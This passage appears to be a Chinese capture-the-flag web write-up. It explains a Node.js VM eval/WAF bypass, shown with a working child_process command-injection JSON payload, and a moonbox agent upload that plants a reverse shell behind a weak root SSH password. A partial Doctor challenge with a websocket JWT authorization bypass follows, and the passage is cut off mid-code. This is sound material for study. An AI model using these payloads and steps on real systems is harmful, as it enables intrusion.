+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">numOfArgs</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>())
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cmd</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;(&#39;&#34;</span>  <span style="color:#f92672">+</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#34;&#39;,&#39;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">runInNewContext</span>(<span style="color:#a6e22e">cmd</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">toString</span>())
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;push&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">numOfElem</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">elemAddr</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>())
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">numOfElem</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">getStack</span>(<span style="color:#a6e22e">elemAddr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">i</span>))
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">getStack</span>(<span style="color:#a6e22e">address</span>))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">28
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[ 0 ]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">read
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Started Convertion...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Your input is:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[short - 3]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[ 0 ]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[short - 2]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[ 0 ]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(function (...a){  return a.map(char=&gt;char.charCodeAt(0)).join(&#39; &#39;);})
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">call_interface
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Ascii is:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[short - 2]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">result
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{{ stack - 2 }}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">result
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Ascii is:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[short - 2]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{{ stack - 3 }}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ok
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[[short - 2]]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">status
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">write
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">exit`</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">code</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">code</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">code</span>[<span style="color:#a6e22e">i</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;[[&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;]]&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> eval(<span style="color:#a6e22e">stack</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;short&#34;</span>, <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">toString</span>()))).<span style="color:#a6e22e">toString</span>()
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">pie</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">respond</span>)
+</span></span></code></pre></div><p>首先第一步操作read，从stdin读取，地址为[[ 0 ]] =&gt; pie，最大读取长度为28。但是code初始只给了20个0空位，也就是说如果读入28个，正好会把第二个操作write的读取地址覆盖，也就是可以控制write函数的读取地址。                   <br>
+waf过滤不全：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">waf</span>(<span style="color:#a6e22e">str</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">pattern</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/(call_interface)|\{\{.*?\}\}/g</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">match</span>(<span style="color:#a6e22e">pattern</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>仔细看write函数，如果地址以{{开头，}}结尾，会将中间的数据传给eval函数而正则表达式.*不能匹配换行，所以可以直接使用<code>{{\nrequire('child_process').exec('id')}}</code>执行命令。read函数可以是字符串也可以是数组，所以可以传此地址。第28位为要执行的命令，27位为传入的数据的长度，写28。</p>
+<pre tabindex="0"><code>{&#34;stdin&#34;:[&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;a&#34;,&#34;28&#34;,&#34;{{\nrequire(&#39;child_process&#39;).exec(&#39;ls / &gt; /app/index.html&#39;)}}&#34;]}
+</code></pre><p><img loading="lazy" src="../../images/1a7f0b9890a44464.png">
+题目环境有个奇怪的地方，本地环境需要/readflag，直接读flag读不出来，但远程环境/readflag读不出来，直接读flag却可以了，dockerfile里的root用户密码也没用上，感觉怪怪的。</p>
+<h1 id="moonbox">moonbox<a hidden class="anchor" aria-hidden="true" href="#moonbox">#</a></h1>
+<blockquote>
+<p>解决</p>
+</blockquote>
+<p>题目给了个moonbox的后台，flag在moonbox-server容器内。                  <br>
+官方的流程图（录制模式）
+<img loading="lazy" src="../../images/60279fb84d17238d.png">
+moonbox有自定义agent的功能，官方文档：</p>
+<blockquote>
+<p>已修改moonbox-agent           <br>
+如修改过moonbox-agent代码，那么需要把修改过的agent代码重新打包。打包步骤如下                <br>
+step1：maven打包(可选)              <br>
+执行 mvn clean install操作                 <br>
+step2：打包moonbox-agent                  <br>
+执行打包命令，命令路径为 /moonbox-agent/moonbox-java-agent/bin                     <br>
+sh ./install-local-agent.sh                  <br>
+step3：agent包上传                 <br>
+moonbox-agent “文件更新”上传包，可以选择step2打包生成的 agengt文件即可。</p>
+</blockquote>
+<p>根据流程，我们可以修改agent能够在JVM所在机器中执行任意shell脚本。              <br>
+不过呢，使用mvn打包的话容易报错，直接在.sandbox-module/bin/start-remote-agent.sh中写入反弹shell的命令。然后打包上传即可（moonbox-agent）。
+目录结构：</p>
+<pre tabindex="0"><code>.sandbox-module/
+    bin/
+        install-local-agent.sh
+        start-remote-agent.sh
+</code></pre><p>正常版本在local-agent目录下，可以参考着改。</p>
+<p>有个坑，nginx不允许传大文件，可以把除shell脚本以外的文件删除，不影响执行。            <br>
+连接JVM机器需要ssh连接，而容器ssh为弱口令root:123456，配置好录制流量即可执行shell脚本。</p>
+<h1 id="doctor">Doctor<a hidden class="anchor" aria-hidden="true" href="#doctor">#</a></h1>
+<blockquote>
+<p>未解决</p>
+</blockquote>
+<p>默认密码和jwt key都改了。</p>
+<p>websocket可以绕过部分jwt限制。                  <br>
+对于recoder的验证，如果是websocket直接通过。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">SuperRecorderGroup</span>() <span style="color:#a6e22e">yee</span>.<span style="color:#a6e22e">HandlerFunc</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">yee</span>.<span style="color:#a6e22e">Context</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">IsWebsocket</span>() {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">role</span> <span style="color:#f92672">:=</span> new(<span style="color:#a6e22e">lib</span>.<span style="color:#a6e22e">Token</span>).<span style="color:#a6e22e">JwtParse</span>(<span style="color:#a6e22e">c</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">role</span>.<span style="color:#a6e22e">IsRecord</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ServerError</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusForbidden</span>, <span style="color:#e6db74">&#34;非法越权操作！&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>对于jwt也是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">yee</span>.<span style="color:#a6e22e">Context</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// cause upgrade websocket  will clear custom header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">// when header add jwt bearer that panic
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">IsWebsocket</span>() {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p>但是没有SuperManageGroup权限。只能获得普通用户权限。</p>
+<p>然后就卡住了~~</p>
+<h2 id="赛后复现">赛后复现<a hidden class="anchor" aria-hidden="true" href="#赛后复现">#</a></h2>
+<p>越权之后可以访问GET /api/v2/fetch/fields</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">FetchTableInfo</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">yee</span>.<span style="color:#a6e22e">Context</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">u</span> <span style="color:#f92672">:=</span> new(<span style="color:#a6e22e">_FetchBind</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Bind</span>(<span style="color:#a6e22e">u</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Logger</span>().<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">common</span>.<span style="color:#a6e22e">ERR_REQ_BIND</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">DataBase</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Table</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">FetchTableFieldsOrIndexes</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Logger</span>().<span style="color:#a6e22e">Critical</span>(<span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">common</span>.<span style="color:#a6e22e">SuccessPayload</span>(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{}{<span style="color:#e6db74">&#34;rows&#34;</span>: <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Rows</span>, <span style="color:#e6db74">&#34;idx&#34;</span>: <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Idx</span>}))
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">common</span>.<span style="color:#a6e22e">ERR_COMMON_MESSAGE</span>(<span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">i18n</span>.<span style="color:#a6e22e">DefaultLang</span>.<span style="color:#a6e22e">Load</span>(<span style="color:#a6e22e">i18n</span>.<span style="color:#a6e22e">INFO_LIBRARY_NAME_TABLE_NAME</span>))))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>调用FetchTableFieldsOrIndexes函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">u</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">_FetchBind</span>) <span style="color:#a6e22e">FetchTableFieldsOrIndexes</span>() <span style="color:#66d9ef">error</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s</span> <span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">CoreDataSource</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">DB</span>().<span style="color:#a6e22e">Where</span>(<span style="color:#e6db74">&#34;source_id =?&#34;</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">SourceId</span>).<span style="color:#a6e22e">First</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">s</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ps</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">lib</span>.<span style="color:#a6e22e">Decrypt</span>(<span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">JWT</span>, <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Password</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">db</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">NewDBSub</span>(<span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">DSN</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Username</span>: <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Username</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Password</span>: <span style="color:#a6e22e">ps</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Host</span>:     <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">IP</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Port</span>:     <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Port</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DBName</span>:   <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">DataBase</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CA</span>:       <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">CAFile</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Cert</span>:     <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">Cert</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Key</span>:      <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">KeyFile</span>,
+</span></span><span style="display:flex;"><span>	})
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">model</span>.<span style="color:#a6e22e">Close</span>(<span style="color:#a6e22e">db</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">Raw</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;SHOW FULL FIELDS FROM `%s`.`%s`&#34;</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">DataBase</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Table</span>)).<span style="color:#a6e22e">Scan</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Rows</span>).<span style="color:#a6e22e">Error</span>; <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">Raw</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;SHOW INDEX FROM `%s`.`%s`&#34;</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">DataBase</span>, <span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Table</span>)).<span style="color:#a6e22e">Scan</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">u</span>.<span style="color:#a6e22e">Idx</span>).<span style="color:#a6e22e">Error</span>; <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>此时数据库中没有DataSource数据，所以s为空，所以后面的DSN中只有DBName可控。             <br>
+model.NewDBSub：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewDBSub</span>(<span style="color:#a6e22e">dsn</span> <span style="color:#a6e22e">DSN</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">gorm</span>.<span style="color:#a6e22e">DB</span>, <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">InitDSN</span>(<span style="color:#a6e22e">dsn</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>	}
